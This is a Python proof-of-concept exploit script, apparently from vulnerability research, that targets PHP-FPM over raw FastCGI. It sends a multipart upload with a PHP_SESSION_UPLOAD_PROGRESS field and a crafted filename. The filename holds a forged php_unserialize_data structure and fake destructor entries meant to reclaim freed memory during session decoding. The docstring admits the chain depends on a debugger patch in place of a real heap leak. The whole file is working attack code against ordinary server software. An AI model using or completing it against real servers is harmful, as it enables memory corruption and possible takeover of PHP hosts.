#!/usr/bin/env python3
"""Raw filename buffer reclaiming the stale php_unserialize_data (d).

Usage: fcgi_dreclaim.py <port> <sid> <filename_pages>

The filename is live at FILE_START, when the pre-RINIT session decode runs.
Its first bytes are a forged php_unserialize_data header: last_dtor points at
a fake var_dtor_entries inside the same buffer, whose signed used_slots is
negative. The gdb probe patches last_dtor to d+0x100 after confirming that the
raw buffer landed on the stale d, because the real chain needs a heap leak
for that pointer.
"""
import socket
import struct
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
pages = int(sys.argv[3]) if len(sys.argv) > 3 else 3
pre = int(sys.argv[4]) if len(sys.argv) > 4 else 0
pre_len = int(sys.argv[5], 0) if len(sys.argv) > 5 else 0x0F00

flen = pages * 4096 - 160
buf = bytearray(b"\x00" * flen)
# forged struct php_unserialize_data at offset 0
buf[0x00:0x08] = (0).to_bytes(8, "little")  # last
buf[0x08:0x10] = (0x4242424242424242).to_bytes(8, "little")  # first_dtor
buf[0x10:0x18] = (0x4343434343434343).to_bytes(8, "little")  # last_dtor
buf[0x18:0x20] = (0).to_bytes(8, "little")                    # allowed_classes
buf[0x20:0x28] = (0).to_bytes(8, "little")                    # ref_props
buf[0x28:0x30] = (0).to_bytes(8, "little")                    # cur_depth
buf[0x30:0x38] = (0x0101010101010101).to_bytes(8, "little")   # max_depth
buf[0x38:0x40] = (0).to_bytes(8, "little")                    # entries.used_slots
buf[0x40:0x48] = (0).to_bytes(8, "little")                    # entries.next
# fake var_dtor_entries at offset 0x100
buf[0x100:0x108] = (-2).to_bytes(8, "little", signed=True)    # used_slots
buf[0x108:0x110] = (0).to_bytes(8, "little")                  # next
buf[0x110:0x120] = b"D" * 16                                  # data[0]
if flen > 0x3020:
    # fake var_dtor_entries at the coalesced offset (d + 0x3000)
    buf[0x3000:0x3008] = (-2).to_bytes(8, "little", signed=True)
    buf[0x3008:0x3010] = (0).to_bytes(8, "little")
    buf[0x3010:0x3020] = b"E" * 16

buf[0x3020:0x3024] = b"N;\x00\x00"

boundary = b"----dreclaim"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
)
for i in range(pre):
    body += (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="pre' + str(i).encode() + b'"\r\n\r\n'
        + b"P" * pre_len + b"\r\n"
    )
body += (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="' + bytes(buf) + b'"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
    b"--" + boundary + b"--\r\n"
)

params = {
    b"SCRIPT_FILENAME": b"/var/www/html/index.php",
    b"REQUEST_METHOD": b"POST",
    b"CONTENT_TYPE": b"multipart/form-data; boundary=" + boundary,
    b"CONTENT_LENGTH": str(len(body)).encode(),
    b"HTTP_COOKIE": b"PHPSESSID=" + sid.encode(),
    b"SERVER_PROTOCOL": b"HTTP/1.1",
    b"REQUEST_URI": b"/index.php",
    b"DOCUMENT_ROOT": b"/var/www/html",
    b"GATEWAY_INTERFACE": b"CGI/1.1",
    b"SERVER_SOFTWARE": b"p2s",
    b"REMOTE_ADDR": b"127.0.0.1",
    b"SERVER_PORT": b"9000",
    b"SERVER_NAME": b"localhost",
}

def nv(name, value):
    def l(x):
        return bytes([x]) if x < 128 else (x | 0x80000000).to_bytes(4, "big")
    return l(len(name)) + l(len(value)) + name + value

def rec(t, rid, data):
    pad = (8 - len(data) % 8) % 8
    return struct.pack("!BBHHBB", 1, t, rid, len(data), pad, 0) + data + b"\0" * pad

rid = 1
out = rec(1, rid, struct.pack("!HBxxxxx", 1, 0))
out += rec(4, rid, b"".join(nv(k, v) for k, v in params.items()))
out += rec(4, rid, b"")
out += rec(5, rid, body)
out += rec(5, rid, b"")

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(out)
resp = b""
try:
    while True:
        h = s.recv(8)
        if len(h) < 8:
            break
        _, t, _, clen, plen, _ = struct.unpack("!BBHHBB", h)
        data = b""
        while len(data) < clen:
            chunk = s.recv(clen - len(data))
            if not chunk:
                break
            data += chunk
        s.recv(plen)
        if t == 6:
            resp += data
        if t == 3:
            break
except socket.timeout:
    pass
s.close()
head, _, payload = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print("resp_body=%d" % len(payload))
